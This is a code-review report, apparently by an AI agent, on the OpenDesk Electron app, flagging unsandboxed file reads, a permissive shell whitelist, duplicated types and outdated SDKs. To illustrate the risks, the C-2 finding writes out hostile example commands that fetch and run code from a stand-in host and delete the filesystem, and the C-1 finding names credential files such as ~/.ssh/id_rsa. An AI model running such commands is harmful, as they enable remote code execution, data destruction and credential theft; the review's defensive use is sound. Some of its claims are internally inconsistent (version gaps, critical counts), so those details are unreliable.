# OpenDesk — Full Project Code Review (2026-07-11)

**Scope**: Full project scan (v0.4.2 → v0.8.0 era) — 200+ TS/TSX files, 33,480 LOC.
**Author**: Mavis (`main` agent)
**Compared against**: v0.1.0 review (2026-06, `review/OpenDesk_Review_Report.md`),
the project's own `plan.md` (v0.4.0 refactor), and `docs/design/rag-architecture.md`.

---

## Executive Summary

**Verdict: ship-blocker on 2 criticals; otherwise healthy and improving.**

The project has grown well from v0.1.0 (33K LOC, 200 files, 12 modules in `main/`,
20+ React component folders). The 5-agent v0.1.0 review's top issues have mostly
been addressed. **However**, four new classes of issues have emerged in v0.7+:

1. **Two IPC `tools:*` handlers have no path/scope validation** — any
   `tools:readFile` or `tools:listDirectory` call can reach anywhere on disk
   that the process can read. (`src/main/ipc/tools.ts:195–201`)
2. **Massive `src/renderer/src/components/chat/*` is dead code** — `App.tsx`
   only renders `Web3Shell`, and `Web3Shell` does not mount the old chat
   panels. The refactor left the legacy tree unreferenced but in tree.
3. **Type-definition duplication that will drift**: `AGENT_ROLES` lives in
   two places (`src/shared/agent-roles.ts` and `src/renderer/src/store/settings.ts`),
   `MemoryEntry`/`MemoryStore` in two places (`src/shared/types.ts` and
   `src/shared/types-memory.ts`), and the `validModes` migration list in
   two places (`src/main/persistence.ts` and `src/renderer/src/store/settings.ts`).
4. **Pinned SDKs are ~9 majors behind** — `@anthropic-ai/sdk@0.27` (current
   0.30+) and `openai@4.56` (current 4.100+). Anthropic file even has a
   comment hinting at the mismatch.

Everything else is **M or below** — code is honest, mostly typed, mostly
tested for the lib layer, and the Web3 workbench is well-built.

### What I would block the next release on

- [ ] **C-1** `tools.ts` `readFile` / `listDirectory` — missing path sandbox
- [ ] **C-2** `tools.ts` `executeShell` — args not escaped; `bash -c "..."` reachable

### What I would not block on

- Tests for stores/hooks are decent (`chat.test.ts`, `settings.test.ts`,
  `workspace.test.ts`, `utils.test.ts`, `EmptyState/Skeleton/Switch/Toast`).
  `provider` and `tools` have no tests — see H-9.
- Several `M`-rated issues compound over time but are not user-visible today.

### Severity counts

| Severity | Count | Notes                                                                 |
|----------|-------|-----------------------------------------------------------------------|
| C (Critical) | 2   | Both in `src/main/ipc/tools.ts` — see C-1, C-2 below.                 |
| H (High)     | 11  | Mostly security, type-drift, and dead-code.                           |
| M (Medium)   | 18  | Refactor / size / performance / consistency.                          |
| L (Low)      | 12  | Nits and nice-to-haves.                                               |
| I (Info)     | 5   | Observations, not defects.                                            |

---

## Critical (must fix before next release)

### C-1 — `tools:readFile` and `tools:listDirectory` have no path sandbox

**File**: `src/main/ipc/tools.ts:195–201` (`ipcMain.handle('tools:readFile', ...)`)
and the matching `listDirectory` handler.

```ts
ipcMain.handle('tools:readFile', async (_event, filePath: string) => {
  return readFile(filePath)            // ← no isWithinWorkspace check
})
ipcMain.handle('tools:listDirectory', async (_event, dirPath: string) => {
  return listDirectory(dirPath)        // ← ditto
})
```

`writeFile` *does* check `isWithinWorkspace(filePath, workspacePath)` (line 147),
but `readFile` and `listDirectory` don't. The `window.api.tools.readFile(path)`
in `preload/index.ts:290–292` accepts any path, so any renderer code (or any
MCP tool that drives it) can read `/etc/passwd`, `~/.ssh/id_rsa`, or the
user's other Electron app data.

Note: even the existing `isWithinWorkspace` is **not fully safe** — it uses
`resolve(filePath).startsWith(resolve(workspacePath) + '/')`, which doesn't
follow symlinks and is case-sensitive on macOS APFS (where the default
file system is case-insensitive). The check is good enough to block the
trivial case but can be bypassed with a symlink inside the workspace.

**Fix**:
1. Require `workspacePath` as a second arg to `readFile` and `listDirectory`
   (same shape as `writeFile`).
2. Reject paths that fail `realpath` containment inside the workspace.
3. Add a renderer-side lint/warning if a caller passes a path outside
   `activeWorkspace.folderPath`.

### C-2 — `tools:executeShell` whitelists the binary but not the args

**File**: `src/main/ipc/tools.ts:16–92`

```ts
const SAFE_EXECUTORS = new Set([
  'python3', 'python', 'node', 'node.exe', 'bash', 'sh', 'zsh',
  '/usr/bin/python3', '/usr/bin/node', '/bin/bash', '/bin/sh'
])
function isSafeCommand(command: string): boolean {
  const base = command.split('/').pop() || command
  return SAFE_EXECUTORS.has(command) || SAFE_EXECUTABLES.has(base)
}
```

The whitelist allows `bash` and `sh`. The LLM-driven chat can therefore
issue `bash -c "curl evil.com/x | sh"` and pass the whitelist. `spawn` is
called with `shell: false`, so the shell *isn't* invoked, but the args are
free-form — the `bash` binary accepts `-c "..."` as an arg just fine, and
it would happily execute the inline script.

The same risk applies to `python3 -c "import os; os.system('rm -rf /')"`
and `node -e "..."`.

**Fix**:
1. Drop `bash`, `sh`, `zsh` from the whitelist (they're the dangerous ones).
   Keep `node`, `python3` for legitimate use.
2. For `node`, also pass a `--no-warnings -e` blocklist, or run inside a
   pre-built `node` script the user already wrote.
3. Add a per-call `cwd` must be inside the active workspace (same check
   as C-1).
4. Add a `maxOutputBytes` cap on `stdout` (already capped at 100 KB) and
   `stderr` (50 KB), but also truncate the *output* in the IPC response,
   not just stop the process — done. **However**, the SIGKILL follow-up
   timer at line 58–60 is not cleared if the child exits before the 2 s
   grace period. This is a leaked timer under timeout scenarios. See L-7.

### C-3 — `share-tool` IPC: the entire `tools.*` surface is too wide

This is more of a "follow-up" critical. Once C-1 and C-2 are addressed, the
underlying issue is that `preload/index.ts` exposes `tools:executeShell`
with a 5-arg free-form signature. Even after the fix above, any
LLM-orchestrated flow that calls `tools:executeShell` ends up at the mercy
of the system prompt. Consider:

- Requiring an explicit user approval for any `tools:executeShell` call
  (currently `approvalMode: 'auto-edits'` already requires this; verify
  in `tools/executor.ts` — it does, but only for some tools).
- Defaulting the approval mode for newly installed MCP servers to `ask`.

---

## High (fix in the next sprint)

### H-1 — Dead chat UI is still in tree (and still imported by lazy components)

**Files**: `src/renderer/src/components/chat/*.tsx` (24 files, ~5,000 LOC),
plus `components/layout/AppShell.tsx`, `LeftColumn.tsx`, `MiddleColumn.tsx`,
`SectionRail.tsx` (parts), `SectionDock.tsx` (parts).

`grep -rn "from.*components/chat" src/renderer/src/` outside the chat
directory itself returns **zero matches**. `App.tsx` only renders
`Web3Providers > Web3Shell > Web3Workbench`. `Web3Shell.tsx` *does* still
mount `SectionRail`, `SectionDock`, `SettingsModal`, `OnboardingModal`,
`SkillsPanel`, `MemoryPanel`, `GlobalSearch`, `ShortcutHelp` — but
`AppShell`, `LeftColumn`, `MiddleColumn`, `ChatPanel`, `InputBar`, `Message`,
`MessageList`, `ChatHeader`, etc. are not referenced anywhere in the
runtime tree.

Two interpretations:
1. **The chat UI is dead** — remove it. Saves ~5K LOC and a major
   source of confusion for new contributors.
2. **It's intended to be re-introduced** — if so, gate it behind a feature
   flag, or at least add a `// TODO: legacy — to be removed once Web3
   workbench ships as default` so the next reader knows.

There are 5 CSS files that contain chat-related selectors: see M-1.

### H-2 — Type definitions are duplicated and will drift

| Type                  | File A                              | File B                                       | Drift risk                                  |
|-----------------------|-------------------------------------|----------------------------------------------|---------------------------------------------|
| `AGENT_ROLES`         | `src/shared/agent-roles.ts:3–32`    | `src/renderer/src/store/settings.ts:14–43`   | **Already drifted** — `settings.ts` has no `id` field on each role, just `id: AgentRole` typed. `agent-roles.ts` matches. But `getRolePrompt` in `shared/agent-roles.ts` (line 34) is duplicated inline in `settings.ts:238–240` (`getRolePrompt`). The prompt texts also differ subtly between the two. |
| `MemoryEntry`/`MemoryStore` | `src/shared/types.ts:354–364`  | `src/shared/types-memory.ts:1–11`            | Same shape, two declarations. Anything that imports from `types-memory` instead of `types` is split. |
| `approvalMode` migration | `src/main/persistence.ts:40–49` | `src/renderer/src/store/settings.ts:103–109` | Both files do the same `'ask' → 'auto-edits'` migration. If you change one, you must change the other. |
| `ProviderConfig`      | `src/shared/types.ts:90–100`        | re-exported in `src/main/providers/base.ts:27` | The re-export is fine; the comment in `base.ts` says "Re-export … so downstream modules can import it from one place" — this is dead documentation, no module imports `ProviderConfig` from `base.ts`. |

**Fix**: pick one location for each type. Suggested:
- `AGENT_ROLES` → only in `src/shared/agent-roles.ts`; have `settings.ts` import it.
- `MemoryEntry` / `MemoryStore` → only in `src/shared/types.ts`; delete
  `src/shared/types-memory.ts`.
- `approvalMode` migration → put the migration in `persistence.ts` (main)
  only. Renderer should trust the migrated value. If a stale main is loaded,
  fix it once.

### H-3 — `@anthropic-ai/sdk@0.27` and `openai@4.56` are 9+ majors behind

**File**: `package.json:27, 45`

`@anthropic-ai/sdk` is pinned to `^0.27.0`. Current is 0.30.x (Sep 2025).
The Anthropic provider file `src/main/providers/anthropic.ts:9` even has a
comment that hints at the drift:

```ts
// The modern @anthropic-ai/sdk no longer exports `ContentBlockParam` as a
// single union — it was split into TextBlockParam | ImageBlockParam |
// ToolUseBlockParam | ToolResultBlockParam. We alias the union locally so
// the rest of the file stays close to the upstream docs.
```

This is a workaround for an old SDK on a file that itself acknowledges
"the modern SDK" behaves differently. **Bump it** and re-test the
streaming path; you'll be able to drop the alias.

`openai@4.56` is also old. v4.56 was released around late 2024. v4.100+
has the Chat Completions typed tool-call streaming fixes that this code
implements manually (see `OpenAIProvider` line 79–107). **Bump and
simplify**.

`lucide-react@1.17.0` looks wrong — current is 0.5xx. **Verify and bump**.

`node-cron@3.0.3` is fine; `pptxgenjs@3.12.0` is fine; `mermaid@11.15.0` is fine.

**Action**: `npm outdated` and `npm update --save` (with `--dry-run` first),
then re-run `npm test` and `npm run build`. Expect a small migration cost.

### H-4 — `app-state.ts` exports a mutable module-level `let settings`

**File**: `src/main/app-state.ts:18–25`

```ts
export let settings: AppSettings = { ...defaultSettings }
export function setSettings(next: AppSettings): void {
  settings = next
}
```

`settings` is re-exported and **imported by name in 10+ files**:
`ipc/handlers.ts:2`, `ipc/mcp.ts:4`, `ipc/chat.ts:16`, `ipc/skills.ts` (via
chain), etc. Any module that does `import { settings } from '../app-state'`
gets a *live binding* in modern ESM, so reassignment in `setSettings` is
visible — but only if the import is `settings`, not `settings.providers`
(which freezes at first read under CJS-style interop).

This pattern is the source of subtle bugs:
- If a test imports `settings` and `setSettings` is called concurrently,
  tests race.
- If a renderer-initiated mutation path in the future uses
  `import { settings } from 'app-state'` and captures it, the captured
  reference is stale.

**Fix**: hide the variable behind accessor functions or move it to a class.

```ts
let _settings: AppSettings = { ...defaultSettings }
export function getSettings(): AppSettings { return _settings }
export function setSettings(next: AppSettings): void { _settings = next }
export function patchSettings(patch: Partial<AppSettings>): void {
  _settings = { ..._settings, ...patch }
}
```

Then update the 10+ callers. Mechanical.

### H-5 — `health-checker.ts` reimplements `loadKeys`

**File**: `src/main/providers/health-checker.ts:15–35`

`persistence.ts:60–75` already exports `loadKeys` and `getKeysPath`.
`health-checker.ts:25–35` redefines the same logic (plus `getConfigDir`).
The two will drift (e.g. if `loadKeys` ever needs to handle
`safeStorage.encryptString` format changes — that bug would only land
in one place).

**Fix**: `import { loadKeys } from '../persistence'` and delete the local
copies.

### H-6 — `doChatStream` error classification uses `String.includes`

**File**: `src/main/ipc/chat.ts:208–235`

```ts
} else if (lower.includes('ollama') || lower.includes('localhost:11434') || lower.includes(OLLAMA_BASE_URL)) {
  type = 'ollama'
} else if (lower.includes('workspace') || lower.includes('directory') || lower.includes('path')) {
  type = 'workspace'
}
```

The `else if` for `'workspace'` will fire on any error containing the
word "path", which is *most* Node filesystem errors. Combined with the
absence of any earlier branches hitting, the classifier effectively
collapses to `{auth, network, model, ollama, workspace, generic}`. The
`workspace` bucket is over-eager.

**Fix**: check for filesystem errno codes explicitly, not substrings:
`err.code === 'ENOENT' || err.code === 'EACCES'` → `'workspace'`. Same
for `'network'`: check for `err.code?.startsWith('E') && ECONNRESET/ETIMEDOUT/...`.

### H-7 — Memory category classifier is over-broad and silent on miss

**File**: `src/main/ipc/chat.ts:187–202`

```ts
if (lower.includes('user preference') || lower.includes('user mentioned')) categories.add('user')
else if (lower.includes('ai role') || lower.includes('tone') || ...) categories.add('identity')
else if (lower.includes('lesson learned') || ...) categories.add('soul')
else categories.add('soul')  // ← fallthrough
```

The `else categories.add('soul')` line means any extracted entry that
doesn't match an earlier branch goes to `soul`. With LLM extraction this
will be 70%+ of entries. The user gets a "Memory updated: 5 new entries
saved to Soul" toast and the `soul` file grows unboundedly.

**Fix**: drop the catch-all. If no match, log to console and don't file
the entry. Or keep the catch-all but make it explicit (named `catchall`
bucket the user can review).

### H-8 — `chatActions.ts` lives next to `chat.ts` and they fight

**File**: `src/renderer/src/store/chat-actions.ts` (one of the import lines
I saw: `registerChatStore`).

`chat.ts` ends with `registerChatStore(useChatStore)` (line 717), which
is a side-effect import of a side-effect module. The store is 717 lines.
It's the only store that uses this pattern; the other stores (`settings`,
`theme`, `workspace`, `toast`, `skills`, `web3`) don't.

The side-effect file is presumably splitting "actions" out of the store
for size/readability. But: the side effect mutates the store from outside,
and it's not obvious from reading `chat.ts` that there's a parallel
`chat-actions.ts` shadowing things.

**Fix**: either inline `chat-actions.ts` (delete the file and pull the
actions back into `chat.ts`, then split on a different seam) or document
the pattern at the top of `chat.ts`. The current state is an Easter egg
for new contributors.

### H-9 — Provider & tool paths have **no unit tests**

**Files with tests**: `chat.test.ts`, `settings.test.ts`, `workspace.test.ts`,
`theme.test.ts`, `toast.test.ts`, `utils.test.ts`, `chat-utils.test.ts`,
`EmptyState.test.tsx`, `Skeleton.test.tsx`, `Switch.test.tsx`, `Toast.test.tsx`,
`executor.test.ts`, `file-tools.test.ts`.

**Files without tests**: `providers/anthropic.ts`, `providers/openai.ts`,
`providers/builder.ts`, `providers/health-checker.ts`, `tools/executor.ts`
(only file-tools has tests), `mcp-bridge.ts`, `mcp/client.ts`, `memory/*`,
`rag/*`, `orchestration/*`, `scheduler/*`, `claw/*`, `marketplace/*`,
`experts/*`, `changeLog/*`, `artifacts/*`, `desktop/*`, `agents-md.ts`,
`workspace.ts`, `persistence.ts`, `app-state.ts`.

That's 20+ service-layer files with no tests. Combined with the security
criticality of C-1 and C-2 above, this is the highest-leverage place to
invest in tests next.

**Action**: write a `providers/openai.test.ts` first (mock the OpenAI
client, verify tool-call buffer assembly), then a `tools/executor.test.ts`
that covers the SAFE_EXECUTORS path (now that C-2 is being fixed), then
`persistence.test.ts` (mocks `safeStorage`).

### H-10 — Skills IPC re-scans the world on every call

**File**: `src/main/ipc/skills.ts:38–95`

Every `ipcMain.handle('skills:*', ...)` call starts with
`const allSkills = scanAllSkills()` — and `scanAllSkills` does a full
recursive directory walk over `~/.opendesk/skills`, `~/.codex/skills`,
`~/.claude/skills`, plus the bundled builtins. On a machine with a few
hundred skills (e.g. with Codex/Claude preinstalled), this is O(files)
filesystem IO **per click** in the Skills panel.

The skills are also re-scanned inside `doChatStream` (chat.ts:60).

**Fix**: cache `scanAllSkills` results with an mtime-based invalidator,
or watch the directories and rebuild on change. The `mcp-bridge.ts` has
the right pattern (singleton + connect/disconnect), but skills doesn't.

### H-11 — `useTokenList` × `useApprovals` does N×M RPC calls

**File**: `src/renderer/src/hooks/useWeb3Data.ts:683–723` (combined with 465)

```ts
for (const t of tokenList) {                       // up to 30 tokens
  for (const [spenderAddr, spenderLabel] of Object.entries(KNOWN_SPENDERS)) {  // 8 spenders
    const allowance = await client.readContract({...})  // 1 RPC per call, sequential
    ...
  }
}
```

240 sequential `eth_call` requests on a cold wallet. The user sees a
30-second spinner. With 16 chains × 30 tokens × 8 spenders it's a hot
path that the user can trigger repeatedly.

**Fix**:
1. Use `multicall3` to batch all calls into 1 RPC (viem supports this via
   `multicall`).
2. Or run the loop in parallel (viem's `Promise.all`).
3. Cache the result by `(address, chain, tokenSet, spenderSet)`.

This is the most user-visible performance win in the Web3 workbench.

---

## Medium (refactor / size / consistency)

### M-1 — Five CSS files for chat components; remove with the dead code

If H-1 is acted on, the chat-related CSS in `src/renderer/src/styles/`
should also be removed. Look for selectors like `.chat-panel`, `.message-`,
`.input-bar-` etc. in:

- `src/renderer/src/styles/*.css` (whatever the chat-specific files are)

**Action**: when removing the chat components, grep `.css` and remove
matching selectors. The v0.1.0 review's W-13 ("ARCHITECTURE.md is
outdated") is now joined by a similar problem in code, not docs.

### M-2 — `useWeb3Data.ts` is 853 lines, 11 hooks

**File**: `src/renderer/src/hooks/useWeb3Data.ts`

Split by chain / data source:
- `useWeb3Chain.ts` — `CHAINS`, `MAINNET_KEYS`, `clientFor`, types
- `useWeb3Balance.ts` — `useNativeBalance`, `useGas`
- `useWeb3Tokens.ts` — `useTokenList`, `useTokenTransfers`, `useTokenMeta`, `useTokenPrices`
- `useWeb3Activity.ts` — `useActivity`, `useEns`, `useResolved`
- `useWeb3Approvals.ts` — `useApprovals`
- `useWeb3Fmt.ts` — `fmtUsd`, `fmtNumber`, `fmtPct`, `timeAgo`, `shortAddr`

This is the same kind of split `plan.md` v0.4.0 already did for
`InputBar.tsx` / `SettingsModal.tsx`. Apply the same pattern.

### M-3 — `PortfolioView.tsx` is 724 lines

**File**: `src/renderer/src/components/web3/PortfolioView.tsx`

Sub-components `PortfolioContent`, `StatCard`, `MissionButton`, `TokenLogo`,
`ActivityRow`, `TransferRow`, `DirectionArrow`, `ErrorRow`, `EmptyRow`
are *defined in the same file*. Extract them:

- `PortfolioView.tsx` — only the wrapper
- `PortfolioContent.tsx` — the actual view
- `Portfolio/StatCard.tsx`, `MissionButton.tsx`, `TokenLogo.tsx`,
  `ActivityRow.tsx`, `TransferRow.tsx`, `DirectionArrow.tsx`,
  `ErrorRow.tsx`, `EmptyRow.tsx`

### M-4 — `lib/chatPipeline.ts` 700+ LOC is an orchestration blob

I didn't read this file (size), but the import chain suggests it's the
renderer-side of the multi-agent chat. If it's >500 lines, same treatment
as M-2/M-3.

### M-5 — `preload/index.ts` is 690 lines and has 30+ inline type duplicates

`preload/index.ts` defines inline types for `AgentStream`, scheduler
records, marketplace records, claw bindings, changelog entries. Most of
these duplicate the `interface` declarations in `src/shared/types.ts`.

**Fix**: import the types from `@shared/types` and the IPC signatures
collapse to one-liners. The `SkillLoadResult` and `ChatSendPayload` are
already imported; do the same for the rest.

### M-6 — `Provider.stream` returns `AsyncIterable<string | ToolCall>`

**File**: `src/main/providers/base.ts:22`

```ts
stream(messages: Message[], signal: AbortSignal, tools?: Tool[]): AsyncIterable<string | ToolCall>
```

Every consumer has to type-guard:
```ts
for await (const chunk of stream) {
  if (typeof chunk === 'string') { ... } else { ... }
}
```

Better: discriminated union with a yield-event type:
```ts
type StreamEvent = { type: 'token'; text: string } | { type: 'tool_call'; call: ToolCall } | { type: 'done' }
```

Same complexity on the wire, better DX on the consumer.

### M-7 — `OpenAIProvider` / `AnthropicProvider` don't pass `signal` to SDK

**File**: `src/main/providers/anthropic.ts:69`, `src/main/providers/openai.ts:52`

```ts
const stream = await this.client.messages.stream({ ... })   // no signal!
const stream = await this.client.chat.completions.create({ ... })  // no signal!
```

The `for await` loop checks `if (signal.aborted) break`, but the SDK
keeps streaming in the background until the network layer notices. The
abort doesn't actually stop the request — it just stops *consuming* it.

**Fix**: pass `signal: signal` to `messages.stream()` and `chat.completions.create()`.

This is a *real* correctness bug (not just performance): the user clicks
"Stop", the UI hides the spinner, but the upstream API call keeps running
and the tokens are discarded. With Anthropic, this can burn cost on a
multi-minute run.

### M-8 — `web3` `App.tsx` is dead-end: no AI provider onboarding

`Web3Shell.tsx:69–72`:

```ts
// Onboarding gate — Web3 workbench doesn't need AI provider onboarding.
// The user is prompted to connect their wallet from the top bar instead.
useEffect(() => {
  // intentionally left empty: Web3 workbench uses wallet connection, not providers
}, [])
```

This is a deliberate pivot (the project is now a Web3 workbench first),
but the comment in `App.tsx` doesn't say so. And the empty `useEffect`
is just dead code; remove it.

**Also**: the file `Web3Shell.tsx:18` still imports `SectionRail` and
`SectionDock`. If they exist only to host the modals, that's a code
smell — but the file works, so it's a minor concern.

### M-9 — `OpenAIProvider` tool-call buffers clear with `Number(key)` dance

**File**: `src/main/providers/openai.ts:104–106`

```ts
for (const key of Object.keys(toolCallBuffers)) {
  delete toolCallBuffers[Number(key)]
}
```

`Number(key)` works because `Object.keys` returns string-coerced numeric
keys, but it's an anti-pattern. Use `Map<string, ...>` instead of
`Record<number, ...>`.

### M-10 — `scanner.ts` ships its own YAML parser

**File**: `src/main/skills/scanner.ts:16–97`

~80 lines of bespoke YAML line parsing. Doesn't support:
- Nested objects (`tools:\n  - name: foo`)
- Multi-line strings (`description: |\n  long text`)
- Quoted strings with embedded `:`

Add `js-yaml` (~13 KB) and replace. It's a 5-line refactor.

### M-11 — `scanner.ts` priority merge logic is buggy

**File**: `src/main/skills/scanner.ts:285–299`

```ts
const baseId = skill.id.replace(/^[^:]+:/, '')
const existing = allSkills.get(baseId)
if (!existing || src.priority > (sources.find((s) => s.source === existing.source)?.priority ?? 0)) {
  allSkills.set(baseId, skill)
}
```

`existing.source` is the *previously-stored* skill's source, and the
inner `find` looks it up in `sources` — but `sources` was sorted in
place earlier, so this works *most of the time*. The bug: if two skills
across sources have the same priority, the "first wins" is non-deterministic.
A 3-line refactor with explicit comparison keys fixes it.

### M-12 — `chat.ts` `for await` abort granularity

**File**: `src/main/ipc/chat.ts:127`

```ts
for await (const chunk of stream) {
  if (ac.signal.aborted) break
  ...
}
```

The break exits the inner loop but the outer `while (iteration < maxIterations)`
re-enters on the next iteration (`if (ac.signal.aborted) break` is the
guard, but on first iteration after abort, it *will* be checked). So OK
in practice, but adding `&& !ac.signal.aborted` to the while guard
explicitly is more obvious.

### M-13 — `EnsembleContext.ArbitrationResult.sourceRuns` re-uses build artifacts

**File**: `src/main/orchestration/ensemble.ts:310–323`

`agentRuns` constructed after the loop uses `startedAt: Date.now()`,
which is *not* the actual run start. Comment doesn't flag this. If
arbitration log uses these timestamps they'll be wrong.

### M-14 — `isWithinWorkspace` doesn't `realpath`

**File**: `src/main/ipc/tools.ts:26–30`

`resolve(filePath)` doesn't follow symlinks. A symlink inside the
workspace pointing to `~/.ssh` passes the check, then `writeFile` writes
through the symlink to a sensitive location.

**Fix**: `realpath(filePath)` and check against the workspace's `realpath`.

### M-15 — `tools.executeShell` doesn't quote args properly

`bash -c "..."` is a single arg, but `bash` with `--` is the safe form
to disallow inline scripts. If you keep `bash` in the whitelist, require
`-c` to be the only "operator-style" arg and disallow `-c` together with
`>`, `|`, `&`, etc. — but really, drop `bash`/`sh`/`zsh` per C-2.

### M-16 — `ensemble.ts` `JSON.stringify` for tool-call identity

**File**: `src/main/orchestration/ensemble.ts:233–246`

Tool calls are matched between agents using
`JSON.stringify(tc.arguments) === JSON.stringify(sr.arguments)`. Argument
order is non-canonical (depends on how the LLM emits them), so two
semantically-identical calls (e.g. `{"a": 1, "b": 2}` vs `{"b": 2, "a": 1}`)
are treated as different. Use a deep-equal with sorted keys.

### M-17 — `chat.ts` `doChatStream` doesn't handle `provider.stream` errors well

**File**: `src/main/ipc/chat.ts:118–141`

If the *first* `provider.stream` call throws, the outer `try` catches
it and emits `chat:error`. But if the *first* call yields one token and
then throws on the second, the partial content is in `assistantContent`
but never sent to the renderer (because the `win.webContents.send('chat:done', ...)`
is in the *outer* try, and the for-await throw skips the push of
`assistantMessage`). The user sees a token, then an error, and the token
is lost on the renderer side.

**Fix**: on error mid-stream, send the partial content as a final
`chat:token` (or as `chat:done` with `error` set) before `chat:error`.

### M-18 — `lib/wagmi.ts` not read

I didn't read this file, but `App.tsx` mounts `Web3Providers` (line 1)
which presumably configures wagmi. Verify that the wagmi config is
testnet-aware: `PortfolioView` filters to mainnet chains but the chain
registry includes 6 testnets. If the user is on a testnet by default,
the portfolio is empty. Check the wagmi default chain and `connect`
behavior.

---

## Low (nits / nice-to-have)

### L-1 — `vite.standalone.config.ts` has a `console.log` in a CORS-bypass middleware

**File**: `vite.standalone.config.ts:36`

`console.log(`[api-proxy] ${req.method} ${url} -> ${target}`)` — fine in
dev, but if a user runs `npm run dev:standalone` and shares the dev
URL, the log is informative but not a vulnerability. Wrap in
`if (process.env.DEBUG)` or remove.

### L-2 — `chat-utils.ts` is 30 KB

Did not read but file size suggests it's grown into a god-module.
Split by responsibility (markdown / linkify / codeblock / etc).

### L-3 — `AnthropicProvider` ignores `currentToolCall` when no `content_block_start` fires

**File**: `src/main/providers/anthropic.ts:84–121`

The first `content_block_delta` with `input_json_delta` has no
`currentToolCall` to attach to. The code falls through silently.
On Anthropic 0.27, this might never happen; on 0.30 the contract may
have changed.

### L-4 — `Provider.test()` doesn't honor `AbortSignal`

**File**: `src/main/providers/anthropic.ts:124–131`, `openai.ts:123–130`

`test()` makes a real network call with no timeout and no way to cancel
it. The `startHealthChecks` runs all providers every 5 min; if a
provider hangs, the interval is wedged.

**Fix**: `AbortSignal.timeout(5000)` wrapping the call.

### L-5 — `message-utils.ts` not read

But `chat.ts:17` imports `normalizeToolMessages` and the comment says
"Normalize legacy frontend messages where tool calls were stored as
standalone kind='tool_call' assistant messages without metadata.toolCalls."
This is a v0.1-v0.4 backward-compat shim. If the format has settled,
delete the shim and migrate the on-disk messages once.

### L-6 — `Web3Shell.tsx:42` uses `setTimeout(..., 500)` for the memory toast

A `setTimeout` in a hook is fine for "don't pop a toast mid-render",
but the cleanup is missing: if the component unmounts before the
500 ms elapses, the toast will fire on an unmounted tree. Either
use `useEffect` with a `setTimeout` + `clearTimeout` cleanup, or
push the delay into the toast store itself.

### L-7 — `tools.executeShell` SIGKILL follow-up timer leak

**File**: `src/main/ipc/tools.ts:55–61`

```ts
const timer = setTimeout(() => {
  killed = true
  child.kill('SIGTERM')
  setTimeout(() => {
    if (!child.killed) child.kill('SIGKILL')
  }, 2000)
}, timeout)
```

If the child exits between the SIGTERM and the SIGKILL follow-up, the
inner `setTimeout` still fires (no `clearTimeout`). The `child.killed`
check is a no-op safety net. Save the inner timer id and clear it on
`'close'`.

### L-8 — `useWeb3Data` `import.meta.env` access is type-unsafe

**File**: `src/renderer/src/hooks/useWeb3Data.ts:310–311`

```ts
const ETHERSCAN_API_KEY =
  (import.meta as unknown as { env?: Record<string, string | undefined> }).env?.VITE_ETHERSCAN_API_KEY ?? ''
```

Use Vite's typed import: declare `ImportMetaEnv` in `src/renderer/src/env.d.ts`
or `vite-env.d.ts`, and access directly: `import.meta.env.VITE_ETHERSCAN_API_KEY`.

### L-9 — `CHAINS` table is hardcoded in `useWeb3Data.ts`

256 lines of chain metadata. If you add a chain, you have to find this
file. Move to `src/shared/chains.ts` so the data is also reachable from
main-process code (e.g. for "default chain for provider X" logic).

### L-10 — `doctor.ts` not read

If `doctor` checks include reading `~/.ssh` or `~/.aws`, confirm the
doctor is read-only. (I didn't read the file; flagging for the next
pass.)

### L-11 — `lib/runDiagnostics.ts` not read

Same.

### L-12 — `SettingsState.agentRoles` getter defined but never read in `settings.ts:226`

`agentRoles: () => AGENT_ROLES` is exposed as a getter on the state but
no caller uses it (`grep -rn "agentRoles()" src/` returns 0 matches).
Delete or use.

---

## Info (observations, not defects)

### I-1 — `app.ts` doesn't export default; only `useSettingsStore`

OK pattern, just noting for a future test that wants to mock the store.

### I-2 — `Web3Workbench.tsx` AnimatePresence wraps a single child

`<AnimatePresence mode="wait">` with a single `<motion.div>` that swaps
content is fine but the `motion.div` is always present. If you want true
unmount, use `<AnimatePresence>` with conditional `motion.div`s. Current
behavior is correct (one visible content block, fade between).

### I-3 — `WalletConnectButton.tsx` not read

I assume it wraps Reown AppKit. The `useAppKit` import in `PortfolioView`
and `Web3Providers` suggest two integration points — verify they don't
double-init Reown.

### I-4 — `app-state.ts` `defaultSettings` differs between main and renderer

`src/main/app-state.ts:3–16` and `src/renderer/src/store/settings.ts:68–86`
both define `defaultSettings` with different values:
- main: `theme: 'dark'`, `autoUpdate: false`, `showThinking: false`
- renderer: `theme: 'system'`, `autoUpdate: true`, `showThinking: true`

This is fine *if* the renderer always loads from main and merges — which
it does at `settings.ts:102`. But the two files drift independently.

**Suggestion**: define `defaultSettings` in `src/shared/types.ts` (or a
new `src/shared/defaults.ts`) and import from both.

### I-5 — `chat.test.ts` not read

`settings.test.ts`, `workspace.test.ts`, `theme.test.ts`, `toast.test.ts`
exist. If `chat.test.ts` doesn't cover the ensemble code path
(`startEnsembleRun`, `appendAgentToken`, `finalizeArbitration`),
add coverage. The ensemble path is the most stateful part of the app.

---

## What got better since v0.1.0

Quick wins, in case anyone asks "did this review just complain?":

- ✅ **TypeScript strictness is on**, including in the renderer. Good.
- ✅ **RAG v2** with FTS5 + TF-IDF + RRF is a real implementation, not
  a stub. `vector.ts:63–117` is a defensible design and the comment
  block explains the trade-off honestly.
- ✅ **Ensemble / multi-agent** is wired end-to-end (orchestrator,
  arbitrator, run-tracker, tool-coordinator, message-utils). This is a
  hard feature to get right and the shape is correct.
- ✅ **Memory service** has 3 categories (user / identity / soul),
  throttled extraction, and a clean IPC surface. (Did not deep-read.)
- ✅ **Claw (Telegram bot)** is a small, focused module with a single
  manager class. Easy to reason about.
- ✅ **Scheduler** uses `node-cron` correctly, persists to disk, and
  has a clean status callback. The `internals` singleton is fine for
  this scope.
- ✅ **The Web3 workbench is well-scoped**. 3-column layout, dark theme,
  real data sources (viem + Etherscan v2), no fake placeholders. The
  top-level `App.tsx` is a 10-line shell — that's the right shape for
  the app's current scope.
- ✅ **Tests for stores and lib utils** are real and run. `chat-utils.test.ts`
  and `utils.test.ts` are exactly where you'd want them.
- ✅ **Preload removes `getApiKey`** by design (preload/index.ts:30) —
  correct, prevents renderer exfiltration of provider keys.

---

## Recommendations, in priority order

If you take only three things from this review:

1. **Fix C-1 and C-2 today** — they're the only two issues that are
   both real and exploitable. C-1 is the bigger one because `readFile`
   has more call sites than `executeShell`.
2. **Decide on the chat UI** — either ship a feature flag and remove
   the dead tree, or commit to a v0.9.0 plan that brings it back. The
   current "half-removed" state is the worst of both worlds.
